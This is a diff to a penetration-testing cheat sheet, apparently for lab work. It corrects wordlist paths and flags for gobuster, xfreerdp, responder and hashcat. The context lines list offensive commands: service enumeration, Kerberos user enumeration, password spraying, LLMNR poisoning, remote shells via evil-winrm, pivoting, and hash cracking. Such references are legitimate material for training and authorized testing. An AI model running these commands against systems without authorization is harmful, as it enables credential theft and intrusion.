@@ -35,7 +35,7 @@ echo '<IP>  <HOST>.<DOMAIN> <HOST>' | sudo tee -a /etc/hosts
 | 22 | `nc -nv <IP> 22` → banner → `ssh -o PreferredAuthentications=none user@<IP>` |
 | 25 | `smtp-user-enum -M VRFY -U users.txt -t <IP>` |
 | 53 | `dig axfr @<IP> <DOMAIN>` → `dig any <DOMAIN> @<IP>` |
-| 80/443 | `whatweb <URL>` → `gobuster dir -u <URL> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,bak` |
+| 80/443 | `whatweb <URL>` → `gobuster dir -u <URL> -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,txt,bak` |
 | 88 | `kerbrute userenum -d <DOMAIN> --dc <DC_IP> users.txt` → **AD environment** |
 | 110/143 | `nc -nv <IP> 110` → `USER <USER>` → `PASS <PASS>` |
 | 135 | `rpcclient -U "" -N <IP>` → `enumdomusers` → `querydispinfo` |
@@ -44,7 +44,7 @@ echo '<IP>  <HOST>.<DOMAIN> <HOST>' | sudo tee -a /etc/hosts
 | 389/636 | `ldapsearch -x -H ldap://<IP> -b "DC=<DOMAIN>,DC=<TLD>" -s sub "(objectClass=*)"` |
 | 1433 | `netexec mssql <IP> -u '<USER>' -p '<PASSWORD>' -x 'whoami'` |
 | 3306 | `mysql -h <IP> -u root -p` |
-| 3389 | `xfreerdp /v:<IP> /u:<USER> /p:<PASSWORD> /cert-ignore /dynamic-resolution` |
+| 3389 | `xfreerdp /v:<IP> /u:<USER> /p:<PASSWORD> /cert:ignore /dynamic-resolution` |
 | 5432 | `psql -h <IP> -U postgres` |
 | 5985 | `evil-winrm -i <IP> -u '<USER>' -p '<PASSWORD>'` |
 | 6379 | `redis-cli -h <IP>` → `INFO` → `CONFIG GET *` |
@@ -255,7 +255,7 @@ impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -usersfile users.txt -format hashca
 netexec smb <DC_IP> -u users.txt -p 'Season2026!' --continue-on-success
 
 # LLMNR/NBT-NS poisoning (if on LAN)
-sudo responder -I tun0 -dwPv
+sudo responder -I tun0 -wPv
 
 # Delegation
 impacket-findDelegation '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
@@ -342,7 +342,7 @@ socat TCP-LISTEN:<LOCAL_PORT>,fork TCP:<INTERNAL_IP>:<PORT>
 | MSSQL 2012+ | `-m 1731` | `0x0200...` |
 
 ```bash
-hashcat -m <MODE> hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat -m <MODE> hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/john/rules/best64.rule
 ```
 
 ---
